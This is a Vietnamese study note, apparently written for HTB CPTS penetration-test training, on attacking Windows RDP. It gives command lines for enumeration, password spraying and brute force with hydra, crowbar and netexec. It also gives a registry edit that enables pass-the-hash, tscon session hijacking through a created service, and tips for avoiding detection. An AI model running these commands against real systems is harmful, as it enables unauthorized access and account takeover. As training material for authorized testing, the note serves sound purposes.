---
title: "Attacking RDP"
date: 2026-04-19 09:00:00 +0700
categories: [HTB_CPTS, Exploitation]
tags: [rdp, exploitation, bruteforce, windows]
description: "HTB CPTS note về enumeration, brute force và khai thác RDP."
pin: false
---
## Mục lục

- RDP — Remote Desktop Protocol
    - Scan & Enum
    - OPSEC — Nmap để lại dấu vết
    - Dangerous Settings — RDP
- Attacking RDP
    - Điểm yếu cốt lõi
    - Brute-Force & Password Spraying
    - Kết nối
    - Pass-the-Hash qua RDP
    - RDP Session Hijacking

---
## RDP — Remote Desktop Protocol (Cổng 3389)

**Công dụng:** Điều khiển desktop đồ hoạ từ xa vào Windows qua mạng IP. Hỗ trợ TLS/SSL từ Windows Vista. Certificate mặc định là self-signed → client không phân biệt được thật/giả.

|Lệnh|Mô Tả|
|---|---|
|`nmap -sV -sC <IP> -p3389 --script rdp*`|Scan RDP — lấy hostname, version, NLA status|
|`nmap -sV -sC <IP> -p3389 --packet-trace --disable-arp-ping -n`|Scan chi tiết với packet trace|
|`git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git`|Cài rdp-sec-check|
|`./rdp-sec-check.pl <FQDN/IP>`|Kiểm tra security settings RDP|
|`xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP>`|Đăng nhập RDP từ Linux|
|`xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP> /cert:ignore`|Đăng nhập RDP bỏ qua SSL warning|
|`xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP> /drive:shared,/tmp`|Chia sẻ thư mục local vào RDP session|
|`rdesktop -u user -p pass ip`|Login RDP (cũ hơn)|

### OPSEC — Nmap để lại dấu vết

> ⚠️ Nmap dùng cookie `mstshash=nmap` khi scan RDP → EDR/IDS có thể phát hiện và block!

### Dangerous Settings — RDP

|Setting|Nguy hiểm vì|
|---|---|
|Expose port 3389 ra internet|Brute-force + BlueKeep từ bên ngoài|
|`NLA = disabled`|Không yêu cầu auth trước khi kết nối → dễ exploit hơn|
|Chưa patch CVE-2019-0708 (BlueKeep)|RCE không cần credentials ☠️|
|Chưa patch CVE-2019-1181/1182 (DejaBlue)|RCE tương tự BlueKeep|
|`Restricted Admin Mode = disabled`|Pass-the-Hash không hoạt động|
|`Encryption Level = Low`|Mã hoá yếu → sniff được session|
|Password policy yếu|Brute-force dễ dàng|

---
## Attacking RDP

**Port:** 3389 **Bản chất:** Remote Desktop Protocol — cung cấp giao diện desktop từ xa. Rất phổ biến trong môi trường doanh nghiệp cho admin và helpdesk.

### Điểm yếu cốt lõi

- **Brute-force / Password spraying:** RDP thường không có account lockout mạnh
- **Pass-the-Hash:** khả thi khi target bật Restricted Admin Mode
- **Session Hijacking:** chiếm phiên RDP của user khác nếu có SYSTEM privilege
- **BlueKeep / DejaBlue:** CVE cũ nhưng vẫn gặp trên hệ thống chưa patch

### Brute-Force & Password Spraying

**Password Spraying** — thử 1 password cho nhiều user → né lockout policy:

```bash
# Password spraying với crowbar (1 password, nhiều user)
crowbar -b rdp -s <IP>/32 -U users.txt -c '<password>'
crowbar -b rdp -s <ip> -u <user> -C creds.txt

# Brute-force với hydra (giới hạn thread — RDP không chịu nhiều kết nối song song)
hydra -L usernames.txt -p '<password>' <IP> rdp -t 4

# Brute-force với 1 user
hydra -l <user> -P /usr/share/wordlists/rockyou.txt rdp://<IP> -t 4
# Verify 1 cred
netexec rdp -u <user> -p  <passwd>
# Spray nhiều password
 netexec rdp -u <user> -p passwords.txt
 # Spray nhiều user
 netexec rdp -u users.txt -p `<pw>`
```

> ⚠️ RDP brute-force tạo nhiều **Event ID 4625** (failed logon) — dễ bị detect. Ưu tiên spraying với tốc độ chậm. ⚠️ Dùng `-t 1` hoặc `-t 4` với Hydra — RDP server dễ bị crash nếu quá nhiều thread.

### Kết nối

```bash
# xfreerdp (khuyến nghị — nhiều tính năng hơn)
xfreerdp /v:<IP> /u:<user> /p:<password>

# rdesktop (cũ hơn)
rdesktop -u <user> -p <password> <IP>

# Thêm options hữu ích cho xfreerdp
xfreerdp /v:<IP> /u:<user> /p:<password> /dynamic-resolution +clipboard /drive:share,/tmp
```

### Pass-the-Hash qua RDP

**Bản chất:** Bình thường RDP yêu cầu plaintext password. Tuy nhiên nếu **Restricted Admin Mode** được bật, RDP dùng NTLM challenge/response → chấp nhận hash thay vì password.

```bash
# Bước 1: Bật Restricted Admin Mode trên registry target (cần admin access trước)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Bước 2: Kết nối RDP bằng NTLM hash
xfreerdp /v:<IP> /u:<user> /pth:<NTLM-hash>
```

> ⚠️ `DisableRestrictedAdmin = 0x0` nghĩa là **bật** Restricted Admin Mode (tên biến ngược). ⚠️ Kỹ thuật này không hoạt động trên mọi hệ thống Windows — luôn thử nhưng đừng phụ thuộc vào nó.

### RDP Session Hijacking

**Bản chất:** Windows quản lý RDP sessions độc lập. User có quyền **SYSTEM** có thể dùng `tscon` để "attach" vào session của user khác **mà không cần mật khẩu** — vì SYSTEM bypass authentication.

**Use case:** Admin đang có session idle (disconnected nhưng chưa logout) → attacker leo thang lên SYSTEM → chiếm session.

```bash
# Bước 1: Liệt kê sessions đang tồn tại
query session
# hoặc
qwinsta

# Output ví dụ:
# SESSIONNAME   USERNAME    ID    STATE
# console       admin       1     Active
# rdp-tcp#1     jdoe        2     Disc       <-- target

# Bước 2: Chiếm session (phải chạy với SYSTEM privilege)
tscon 2 /dest:rdp-tcp#0

# Bước 3: Nếu chưa có SYSTEM → tạo service để leo thang
sc create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
net start sessionhijack
```

> ⚠️ Kỹ thuật này **không còn hoạt động trên Windows Server 2019**. ⚠️ Session "Disc" (disconnected) là mục tiêu lý tưởng — user đã ngắt kết nối nhưng chưa logout, session vẫn tồn tại với credentials còn active.
